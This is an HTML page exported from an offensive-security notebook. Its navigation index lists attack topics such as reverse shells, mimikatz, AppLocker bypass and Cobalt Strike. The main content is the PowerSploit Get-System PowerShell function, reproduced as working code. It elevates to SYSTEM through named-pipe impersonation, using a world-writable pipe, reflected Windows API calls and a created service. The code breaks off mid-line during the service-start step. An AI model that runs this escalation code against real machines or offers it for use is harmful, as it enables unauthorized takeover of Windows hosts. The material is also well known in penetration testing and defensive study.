<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>powershell - get-system</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="trash.html">trash</a></p>

<p><a href="lockpicking.html">lockpicking</a></p>

<ol>
<li><a href="lockpicking--blackbox_picking.html">blackbox picking</a></li>
</ol>
<p><a href="new_folder_2.html">new folder 2</a></p>

<p><a href="Commands.html">Commands</a></p>

<ol>
<li><a href="Commands--arp-spoof.html">arp-spoof</a></li>
<li><a href="Commands--wp-scan.html">wp-scan</a></li>
<li><a href="Commands--put-http.html">put-http</a></li>
<li><a href="Commands--crackmapexec.html">crackmapexec</a></li>
<li><a href="Commands--redis.html">redis</a></li>
<li><a href="Commands--sshuttle.html">sshuttle</a></li>
<li><a href="Commands--c~.html">c#</a></li>
<li><a href="Commands--nikto-proxy.html">nikto-proxy</a></li>
<li><a href="Commands--gather-gpp-creds.html">gather-gpp-creds</a></li>
<li><a href="Commands--webdav.html">webdav</a></li>
<li><a href="Commands--trash.html">trash</a></li>
<li><a href="Commands--nessus-openvas.html">nessus-openvas</a></li>
<li><a href="Commands--mimikatz.html">mimikatz</a></li>
<ol>
<li><a href="Commands--mimikatz--mimikatz_-_remote_control,_rpc.html">mimikatz - remote control, rpc</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_list_commands_in_module.html">mimikatz - list commands in module</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_start_and_stop_processes.html">mimikatz - start and stop processes</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_applocker_bypass_and_other_sn.html">mimikatz - applocker bypass and other sn</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_rdp.html">mimikatz - rdp</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_avoid_new_events.html">mimikatz - avoid new events</a></li>
<li><a href="Commands--mimikatz--mimikatz_list_modules.html">mimikatz list modules</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_tokens.html">mimikatz - tokens</a></li>
<li><a href="Commands--mimikatz--mimikatz_-_base64_all_the_things.html">mimikatz - base64 all the things</a></li>
</ol>
<li><a href="Commands--masscan.html">masscan</a></li>
<li><a href="Commands--nmap_and_scanning.html">nmap and scanning</a></li>
<li><a href="Commands--shellshock-squid.html">shellshock-squid</a></li>
<li><a href="Commands--virtual-box_guest_additions.html">virtual-box guest additions</a></li>
<li><a href="Commands--rbash.html">rbash</a></li>
<li><a href="Commands--ping_sweep.html">ping sweep</a></li>
<li><a href="Commands--cut_commands.html">cut commands</a></li>
<li><a href="Commands--mount-shares.html">mount-shares</a></li>
<li><a href="Commands--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--xss-iframe.html">xss-iframe</a></li>
<li><a href="Commands--dns-zone-transfer.html">dns-zone-transfer</a></li>
<li><a href="Commands--nginx-bypass.html">nginx-bypass</a></li>
<li><a href="Commands--spawn_a_better_shell_-_break_out_of_shit.html">spawn_a_better_shell - break out of shit</a></li>
<li><a href="Commands--port-forward.html">port-forward</a></li>
<li><a href="Commands--physical_hacking.html">physical hacking</a></li>
<ol>
<li><a href="Commands--physical_hacking--rasperry_pi.html">rasperry pi</a></li>
<li><a href="Commands--physical_hacking--bash_bunny.html">bash bunny</a></li>
</ol>
<li><a href="Commands--searchsploit.html">searchsploit</a></li>
<li><a href="Commands--custom-payloads.html">custom-payloads</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land.html">bypass applocker - live off land</a></li>
<ol>
<li><a href="Commands--bypass_applocker_-_live_off_land--msbuild.html">msbuild</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--installutil.html">installutil</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--demiguise.html">demiguise</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--mshta.html">mshta</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regsvcs.html">regsvcs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--pubprn.vbs.html">pubprn.vbs</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--regasm_2.html">regasm 2</a></li>
<li><a href="Commands--bypass_applocker_-_live_off_land--vbs_macro.html">vbs macro</a></li>
</ol>
<li><a href="Commands--pass_the_hash.html">pass the hash</a></li>
<li><a href="Commands--snmp.html">snmp</a></li>
<li><a href="Commands--client-side-iframe-attack.html">client-side-iframe-attack</a></li>
<li><a href="Commands--mortar-shells.html">mortar-shells</a></li>
<li><a href="Commands--bypass-uac.html">bypass-uac</a></li>
<li><a href="Commands--privilege-escalation-linux.html">privilege-escalation-linux</a></li>
<li><a href="Commands--rdesktop_and_screen_for_linux.html">rdesktop and screen for linux</a></li>
<li><a href="Commands--password-cracking.html">password-cracking</a></li>
<li><a href="Commands--cobalt_strike_2.html">cobalt strike 2</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--cobalt_strike_certificates.html">cobalt strike certificates</a></li>
<li><a href="Commands--cobalt_strike_2--malleable.html">malleable</a></li>
<li><a href="Commands--cobalt_strike_2--cpl_resource_runner_payload.html">cpl resource runner payload</a></li>
<li><a href="Commands--cobalt_strike_2--situational_awareness_-_harmj0y.html">situational awareness - harmj0y</a></li>
<li><a href="Commands--cobalt_strike_2--go_daddy_domain.html">go daddy domain</a></li>
<li><a href="Commands--cobalt_strike_2--safety.html">safety</a></li>
<li><a href="Commands--cobalt_strike_2--random_commands.html">random commands</a></li>
<li><a href="Commands--cobalt_strike_2--playbook.html">playbook</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--playbook--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--overpass_the_hash_with_rubeus-beacon_-_h.html">overpass the hash with rubeus-beacon - h</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--after_initial_access.html">after initial access</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--persistence.html">persistence</a></li>
<li><a href="Commands--cobalt_strike_2--playbook--mail_and_smtp_enumeration-manipulation.html">mail and smtp enumeration-manipulation</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--generating_certificates.html">generating certificates</a></li>
<li><a href="Commands--cobalt_strike_2--github_repos.html">github repos</a></li>
<li><a href="Commands--cobalt_strike_2--golden_ticket.html">golden ticket</a></li>
<li><a href="Commands--cobalt_strike_2--apache_rewrite_.htaccess.html">apache rewrite .htaccess</a></li>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion.html">malware av evasion</a></li>
<ol>
<li><a href="Commands--cobalt_strike_2--malware_av_evasion--main.go.html">main.go</a></li>
</ol>
<li><a href="Commands--cobalt_strike_2--c2_infrastructure.html">c2 infrastructure</a></li>
<li><a href="Commands--cobalt_strike_2--sid_hopping.html">sid hopping</a></li>
</ol>
<li><a href="Commands--random_shellcode_-_scratch-pad.html">random shellcode - scratch-pad</a></li>
<li><a href="Commands--powerview.html">powerview</a></li>
<ol>
<li><a href="Commands--powerview--new_page.html">new page</a></li>
</ol>
<li><a href="Commands--windows.html">windows</a></li>
<ol>
<li><a href="Commands--windows--windows_-_powerview_3.0,_harmj0y.html">windows - powerview 3.0, harmj0y</a></li>
<li><a href="Commands--windows--windows_passwords.html">windows passwords</a></li>
<li><a href="Commands--windows--windows_-_search_4_loot.html">windows - search 4 loot</a></li>
<li><a href="Commands--windows--windows_-_laps_abuse.html">windows - laps abuse</a></li>
<li><a href="Commands--windows--windows_-_powershell_web_access.html">windows - powershell web access</a></li>
<li><a href="Commands--windows--windows_-_port_forward.html">windows - port forward</a></li>
<li><a href="Commands--windows--windows_privesc.html">windows privesc</a></li>
<li><a href="Commands--windows--windows_enumeration.html">windows enumeration</a></li>
<li><a href="Commands--windows--windows_-_uninstall_patches.html">windows - uninstall patches</a></li>
<li><a href="Commands--windows--windows_-_powerview,_enumerate_groups-ac.html">windows - powerview, enumerate groups-ac</a></li>
<li><a href="Commands--windows--windows_-_powerview_acl_enum-abuse.html">windows - powerview acl enum-abuse</a></li>
<li><a href="Commands--windows--windows_service_abuse.html">windows service abuse</a></li>
<li><a href="Commands--windows--windows_firewall.html">windows firewall</a></li>
<li><a href="Commands--windows--windows_-_powershell_-_quickies.html">windows - powershell - quickies</a></li>
</ol>
<li><a href="Commands--outlook_and_owa.html">outlook and owa</a></li>
<li><a href="Commands--tmux_2.html">tmux 2</a></li>
<ol>
<li><a href="Commands--tmux_2--tmux_config.html">tmux config</a></li>
<li><a href="Commands--tmux_2--tmux_cheat_sheet.html">tmux cheat sheet</a></li>
</ol>
<li><a href="Commands--reverse_shell_one_liners.html">reverse shell one liners</a></li>
<ol>
<li><a href="Commands--reverse_shell_one_liners--java_reverse_shell.html">java reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--python_reverse_shell.html">python reverse shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--php-reverse-shell.html">php-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--perl-reverse-shell-cgi-format.html">perl-reverse-shell-cgi-format</a></li>
<li><a href="Commands--reverse_shell_one_liners--c-language-reverse-shell.html">c-language-reverse-shell</a></li>
<li><a href="Commands--reverse_shell_one_liners--ruby.html">ruby</a></li>
</ol>
<li><a href="Commands--tar.html">tar</a></li>
<li><a href="Commands--ssh.html">ssh</a></li>
<li><a href="Commands--named_pipes.html">named pipes</a></li>
<li><a href="Commands--enumeration.html">enumeration</a></li>
<li><a href="Commands--python.html">python</a></li>
<li><a href="Commands--nac_testing.html">nac testing</a></li>
<li><a href="Commands--red_team.html">red team</a></li>
<ol>
<li><a href="Commands--red_team--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--lateral_movement.html">lateral movement</a></li>
<li><a href="Commands--red_team--privilege_escalation_across_trusts.html">privilege escalation across trusts</a></li>
<li><a href="Commands--red_team--active_directory_one_liners.html">active directory one liners</a></li>
<li><a href="Commands--red_team--enumeration.html">enumeration</a></li>
<li><a href="Commands--red_team--persistence_techniques.html">persistence techniques</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts.html">abusing sql server trusts</a></li>
<ol>
<li><a href="Commands--red_team--abusing_sql_server_trusts--privilege_escalation.html">privilege escalation</a></li>
<li><a href="Commands--red_team--abusing_sql_server_trusts--post_exploitation_enumeration.html">post exploitation enumeration</a></li>
</ol>
<li><a href="Commands--red_team--domain_privilege_escalation.html">domain privilege escalation</a></li>
<li><a href="Commands--red_team--file_servers_and_files.html">file servers and files</a></li>
<li><a href="Commands--red_team--bloodhound.html">bloodhound</a></li>
<li><a href="Commands--red_team--forest_enumeration.html">forest enumeration</a></li>
</ol>
<li><a href="Commands--smb-netbios-rpc.html">smb-netbios-rpc</a></li>
<li><a href="Commands--laps.html">laps</a></li>
<li><a href="Commands--password-grep.html">password-grep</a></li>
<li><a href="Commands--xml-xxe-xpath.html">xml-xxe-xpath</a></li>
<li><a href="Commands--ports.html">ports</a></li>
<li><a href="Commands--de-duplicate.html">de-duplicate</a></li>
<li><a href="Commands--mac_address_change.html">mac address change</a></li>
<li><a href="Commands--test-for-xxe.html">test-for-xxe</a></li>
<li><a href="Commands--droopescan.html">droopescan</a></li>
<li><a href="Commands--dnscat.html">dnscat</a></li>
<li><a href="Commands--fresh-install.html">fresh-install</a></li>
<li><a href="Commands--httpscreenshot.html">httpscreenshot</a></li>
<li><a href="Commands--buffer-overflow.html">buffer-overflow</a></li>
<li><a href="Commands--osint.html">osint</a></li>
<li><a href="Commands--spooler_exploit.html">spooler exploit</a></li>
<li><a href="Commands--wifi-hacking.html">wifi-hacking</a></li>
<ol>
<li><a href="Commands--wifi-hacking--aircrack-ng_and_jtr_attack.html">aircrack-ng and jtr attack</a></li>
<li><a href="Commands--wifi-hacking--crack_wep.html">crack wep</a></li>
<li><a href="Commands--wifi-hacking--aircrack-ng.html">aircrack-ng</a></li>
<li><a href="Commands--wifi-hacking--fluxion.html">fluxion</a></li>
<li><a href="Commands--wifi-hacking--reaver.html">reaver</a></li>
<li><a href="Commands--wifi-hacking--wep_shared_key_authentication_attack.html">wep shared key authentication attack</a></li>
<li><a href="Commands--wifi-hacking--cowpatty_attack.html">cowpatty attack</a></li>
<li><a href="Commands--wifi-hacking--new_page.html">new page</a></li>
<li><a href="Commands--wifi-hacking--hostapd.html">hostapd</a></li>
<li><a href="Commands--wifi-hacking--rogue_access_point.html">rogue access point</a></li>
<li><a href="Commands--wifi-hacking--cracking_wpa_attack.html">cracking wpa attack</a></li>
<li><a href="Commands--wifi-hacking--wifite.html">wifite</a></li>
<li><a href="Commands--wifi-hacking--eaphammer.html">eaphammer</a></li>
<li><a href="Commands--wifi-hacking--handshake-via-pcap.html">handshake-via-pcap</a></li>
<li><a href="Commands--wifi-hacking--cracking_wep_via_a_client_attack.html">cracking wep via a client attack</a></li>
<li><a href="Commands--wifi-hacking--basics.html">basics</a></li>
<li><a href="Commands--wifi-hacking--pyrit_attack.html">pyrit attack</a></li>
<li><a href="Commands--wifi-hacking--clientless_wep_attack.html">clientless wep attack</a></li>
</ol>
<li><a href="Commands--images-with-files-in-them.html">images-with-files-in-them</a></li>
<li><a href="Commands--xxd.html">xxd</a></li>
<li><a href="Commands--proxychains.html">proxychains</a></li>
<li><a href="Commands--tools-sources.html">tools-sources</a></li>
<li><a href="Commands--lolbins.html">lolbins</a></li>
<li><a href="Commands--goddi_-_domain_enumeration.html">goddi - domain enumeration</a></li>
<li><a href="Commands--sed_and_changing_files_for_malware_evasi.html">sed and changing files for malware evasi</a></li>
<li><a href="Commands--mail_sniper.html">mail sniper</a></li>
<li><a href="Commands--postgresql.html">postgresql</a></li>
<li><a href="Commands--files-inside-of-pictures.html">files-inside-of-pictures</a></li>
<li><a href="Commands--unicorn_scan.html">unicorn scan</a></li>
<li><a href="Commands--metasploit-meterpreter.html">metasploit-meterpreter</a></li>
<ol>
<li><a href="Commands--metasploit-meterpreter--metasploit_-_reverse_shells.html">metasploit - reverse_shells</a></li>
<li><a href="Commands--metasploit-meterpreter--metasploit-nessus.html">metasploit-nessus</a></li>
<li><a href="Commands--metasploit-meterpreter--meterpreter.html">meterpreter</a></li>
<li><a href="Commands--metasploit-meterpreter--network.html">network</a></li>
</ol>
<li><a href="Commands--compiling-code.html">compiling-code</a></li>
<li><a href="Commands--remote_and_local_file_inclusion.html">remote and local file inclusion</a></li>
<li><a href="Commands--proxychains-admin-network.html">proxychains-admin-network</a></li>
<li><a href="Commands--linux.html">linux</a></li>
<li><a href="Commands--privilege-escalation-windows_-_and_empir.html">privilege-escalation-windows - and empir</a></li>
<li><a href="Commands--powershell.html">powershell</a></li>
<ol>
<li><a href="Commands--powershell--constrained_language_breakout.html">constrained language breakout</a></li>
<li><a href="Commands--powershell--powerup_-_privilege_escalation.html">powerup - privilege escalation</a></li>
<li><a href="Commands--powershell--user_enumeration.html">user enumeration</a></li>
<li><a href="Commands--powershell--powershell_-_get-system.html">powershell - get-system</a></li>
<li><a href="Commands--powershell--powershell_sans_cheat.html">powershell sans cheat</a></li>
<li><a href="Commands--powershell--find_files_by_name.html">find files by name</a></li>
<li><a href="Commands--powershell--random_powershell.html">random powershell</a></li>
<li><a href="Commands--powershell--domain_enumeration.html">domain enumeration</a></li>
<li><a href="Commands--powershell--enable_psremoting.html">enable psremoting</a></li>
</ol>
<li><a href="Commands--sql.html">sql</a></li>
<li><a href="Commands--waf.html">waf</a></li>
<li><a href="Commands--network-change-ip.html">network-change-ip</a></li>
<li><a href="Commands--merlin.html">merlin</a></li>
<li><a href="Commands--web_discovery.html">web discovery</a></li>
<li><a href="Commands--exploit-pack.html">exploit-pack</a></li>
<li><a href="Commands--get-browserdata.html">get-browserdata</a></li>
<li><a href="Commands--user_agent.html">user agent</a></li>
<li><a href="Commands--group-policy-decrypt-passwords.html">group-policy-decrypt-passwords</a></li>
<li><a href="Commands--root_user_add.html">root_user_add</a></li>
<li><a href="Commands--hex_encode_command_line.html">hex encode command line</a></li>
<li><a href="Commands--block-ip-iptables.html">block-ip-iptables</a></li>
<li><a href="Commands--host_discovery-dns.html">host_discovery-dns</a></li>
<li><a href="Commands--certificate_tls_and_ssl.html">certificate tls and ssl</a></li>
<li><a href="Commands--wget.html">wget</a></li>
<li><a href="Commands--php-shells.html">php-shells</a></li>
<li><a href="Commands--payloads.html">payloads</a></li>
<li><a href="Commands--ad-notes.html">ad-notes</a></li>
<ol>
<li><a href="Commands--ad-notes--laps_abuse.html">laps abuse</a></li>
<li><a href="Commands--ad-notes--more-ad-notes.html">more-ad-notes</a></li>
<li><a href="Commands--ad-notes--ad-notes-chirag.html">ad-notes-chirag</a></li>
<li><a href="Commands--ad-notes--pam_abuse.html">pam abuse</a></li>
</ol>
<li><a href="Commands--have_a_shell.html">have_a_shell</a></li>
<li><a href="Commands--curl-wget.html">curl-wget</a></li>
<li><a href="Commands--shell-for-buffer-overflow.html">shell-for-buffer-overflow</a></li>
<li><a href="Commands--__NOTEBOOK__.html">__NOTEBOOK__</a></li>
<ol>
<li><a href="Commands--__NOTEBOOK__--icons.html">icons</a></li>
<li><a href="Commands--__NOTEBOOK__--lost_found.html">lost_found</a></li>
<li><a href="Commands--__NOTEBOOK__--orphans.html">orphans</a></li>
</ol>
<li><a href="Commands--netcat-ftp.html">netcat-ftp</a></li>
<li><a href="Commands--responder.html">responder</a></li>
<li><a href="Commands--assembly.html">assembly</a></li>
</ol>
<p><a href="mobile.html">mobile</a></p>

<ol>
<li><a href="mobile--smali_and_baksmali.html">smali and baksmali</a></li>
<li><a href="mobile--dex2jar.html">dex2jar</a></li>
<li><a href="mobile--apktool.html">apktool</a></li>
<li><a href="mobile--baby_steps.html">baby steps</a></li>
<li><a href="mobile--jd-gui.html">jd-gui</a></li>
<li><a href="mobile--qark.html">qark</a></li>
</ol>
<p><a href="mainframe.html">mainframe</a></p>

<ol>
<li><a href="mainframe--nmap_stuff_-_recon.html">nmap stuff - recon</a></li>
<li><a href="mainframe--tso_commands.html">tso commands</a></li>
</ol>
<p><a href="links_and_random.html">links and random</a></p>

<ol>
<li><a href="links_and_random--mimikatz.html">mimikatz</a></li>
<li><a href="links_and_random--wifi_driver_stuff.html">wifi driver stuff</a></li>
<li><a href="links_and_random--bypassing_applocker_living_off_land.html">bypassing applocker living off land</a></li>
<li><a href="links_and_random--ptx.html">ptx</a></li>
</ol></div>
<div class="page"><h1><b><u>powershell - get-system</u></b></h1>function Get-System {<br />&lt;#<br />    .SYNOPSIS<br /><br />        GetSystem functionality inspired by Meterpreter's getsystem.<br />        'NamedPipe' impersonation doesn't need SeDebugPrivilege but does create<br />        a service, 'Token' duplications a SYSTEM token but needs SeDebugPrivilege.<br />        NOTE: if running PowerShell 2.0, start powershell.exe with '-STA' to ensure<br />        token duplication works correctly.<br /><br />        PowerSploit Function: Get-System<br />        Author: @harmj0y, @mattifestation<br />        License: BSD 3-Clause<br />        Required Dependencies: None<br />        Optional Dependencies: None<br /><br />    .PARAMETER Technique<br /><br />        The technique to use, 'NamedPipe' or 'Token'.<br /><br />    .PARAMETER ServiceName<br /><br />        The name of the service used with named pipe impersonation, defaults to 'TestSVC'.<br /><br />    .PARAMETER PipeName<br /><br />        The name of the named pipe used with named pipe impersonation, defaults to 'TestSVC'.<br /><br />    .PARAMETER RevToSelf<br />    <br />        Reverts the current thread privileges.<br /><br />    .PARAMETER WhoAmI<br /><br />        Switch. Display the credentials for the current PowerShell thread.<br /><br />    .EXAMPLE<br />        <br />        PS&gt; Get-System<br /><br />        Uses named impersonate to elevate the current thread token to SYSTEM.<br /><br />    .EXAMPLE<br />        <br />        PS&gt; Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'<br /><br />        Uses named impersonate to elevate the current thread token to SYSTEM<br />        with a custom service and pipe name.<br /><br />    .EXAMPLE<br />        <br />        PS&gt; Get-System -Technique Token<br /><br />        Uses token duplication to elevate the current thread token to SYSTEM.<br /><br />    .EXAMPLE<br />        <br />        PS&gt; Get-System -WhoAmI<br /><br />        Displays the credentials for the current thread.<br /><br />    .EXAMPLE<br />        <br />        PS&gt; Get-System -RevToSelf<br /><br />        Reverts the current thread privileges.<br /><br />    .LINK<br />    <br />        https://github.com/rapid7/meterpreter/blob/2a891a79001fc43cb25475cc43bced9449e7dc37/source/extensions/priv/server/elevate/namedpipe.c<br />        https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot<br />        http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/<br />        http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/<br />#&gt;<br />    [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]<br />    param(<br />        [Parameter(ParameterSetName = "NamedPipe")]<br />        [Parameter(ParameterSetName = "Token")]<br />        [String]<br />        [ValidateSet("NamedPipe", "Token")]<br />        $Technique = 'NamedPipe',<br /><br />        [Parameter(ParameterSetName = "NamedPipe")]<br />        [String]<br />        $ServiceName = 'TestSVC',<br /><br />        [Parameter(ParameterSetName = "NamedPipe")]<br />        [String]<br />        $PipeName = 'TestSVC',<br /><br />        [Parameter(ParameterSetName = "RevToSelf")]<br />        [Switch]<br />        $RevToSelf,<br /><br />        [Parameter(ParameterSetName = "WhoAmI")]<br />        [Switch]<br />        $WhoAmI<br />    )<br /><br />    $ErrorActionPreference = "Stop"<br /><br />    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html<br />    function Local:Get-DelegateType<br />    {<br />        Param<br />        (<br />            [OutputType([Type])]<br />            <br />            [Parameter( Position = 0)]<br />            [Type[]]<br />            $Parameters = (New-Object Type[](0)),<br />            <br />            [Parameter( Position = 1 )]<br />            [Type]<br />            $ReturnType = [Void]<br />        )<br /><br />        $Domain = [AppDomain]::CurrentDomain<br />        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')<br />        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)<br />        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)<br />        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])<br />        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)<br />        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')<br />        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)<br />        $MethodBuilder.SetImplementationFlags('Runtime, Managed')<br />        <br />        Write-Output $TypeBuilder.CreateType()<br />    }<br /><br />    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html<br />    function Local:Get-ProcAddress<br />    {<br />        Param<br />        (<br />            [OutputType([IntPtr])]<br />        <br />            [Parameter( Position = 0, Mandatory = $True )]<br />            [String]<br />            $Module,<br />            <br />            [Parameter( Position = 1, Mandatory = $True )]<br />            [String]<br />            $Procedure<br />        )<br /><br />        # Get a reference to System.dll in the GAC<br />        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |<br />            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }<br />        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')<br />        # Get a reference to the GetModuleHandle and GetProcAddress methods<br />        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')<br />        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')<br />        # Get a handle to the module specified<br />        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))<br />        $tmpPtr = New-Object IntPtr<br />        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)<br />        <br />        # Return the address of the function<br />        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))<br />    }<br /><br />    # performs named pipe impersonation to elevate to SYSTEM without needing<br />    #   SeDebugPrivilege<br />    function Local:Get-SystemNamedPipe {<br />        param(<br />            [String]<br />            $ServiceName = "TestSVC",<br /><br />            [String]<br />            $PipeName = "TestSVC"<br />        )<br /><br />        $Command = "%COMSPEC% /C start %COMSPEC% /C `"timeout /t 3 &gt;nul&amp;&amp;echo $PipeName &gt; \\.\pipe\$PipeName`""<br /><br />        # create the named pipe used for impersonation and set appropriate permissions<br />        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity<br />        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )<br />        $PipeSecurity.AddAccessRule($AccessRule)<br />        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)<br /><br />        $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()<br /><br />        # Declare/setup all the needed API function<br />        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html <br />        $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient<br />        $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])<br />        $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)<br /><br />        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle<br />        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])<br />        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)<br /><br />        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA<br />        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])<br />        $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)<br />        <br />        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA<br />        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])<br />        $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)<br />      <br />        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA<br />        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])<br />        $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)<br /><br />        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA<br />        $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])<br />        $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)<br /><br />        $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService<br />        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])<br />        $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)<br /><br />        $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError<br />        $GetLastErrorDelegate = Get-DelegateType @() ([Int])<br />        $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)<br /><br />        # Step 1 - OpenSCManager()<br />        # 0xF003F = SC_MANAGER_ALL_ACCESS<br />        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx<br />        Write-Verbose "Opening service manager"<br />        $ManagerHandle = $OpenSCManagerA.Invoke("\\localhost", "ServicesActive", 0xF003F)<br />        Write-Verbose "Service manager handle: $ManagerHandle"<br /><br />        # if we get a non-zero handle back, everything was successful<br />        if ($ManagerHandle -and ($ManagerHandle -ne 0)) {<br /><br />            # Step 2 - CreateService()<br />            # 0xF003F = SC_MANAGER_ALL_ACCESS<br />            # 0x10 = SERVICE_WIN32_OWN_PROCESS<br />            # 0x3 = SERVICE_DEMAND_START<br />            # 0x1 = SERVICE_ERROR_NORMAL<br />            Write-Verbose "Creating new service: '$ServiceName'"<br />            try {<br />                $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)<br />                $err = $GetLastError.Invoke()<br />            }<br />            catch {<br />                Write-Warning "Error creating service : $_"<br />                $ServiceHandle = 0<br />            }<br />            Write-Verbose "CreateServiceA Handle: $ServiceHandle"<br /><br />            if ($ServiceHandle -and ($ServiceHandle -ne 0)) {<br />                $Success = $True<br />                Write-Verbose "Service successfully created"<br /><br />                # Step 3 - CloseServiceHandle() for the service handle<br />                Write-Verbose "Closing service handle"<br />                $Null = $CloseServiceHandle.Invoke($ServiceHandle)<br /><br />                # Step 4 - OpenService()<br />                Write-Verbose "Opening the service '$ServiceName'"<br />                $ServiceHandle = $OpenServiceA.Invoke($ManagerHandle, $ServiceName, 0xF003F)<br />                Write-Verbose "OpenServiceA handle: $ServiceHandle"<br /><br />                if ($ServiceHandle -and ($ServiceHandle -ne 0)){<br /><br />                    # Step 5 - StartService()<br />                    Write-Verbose "Starting the service"<br />                    $val = 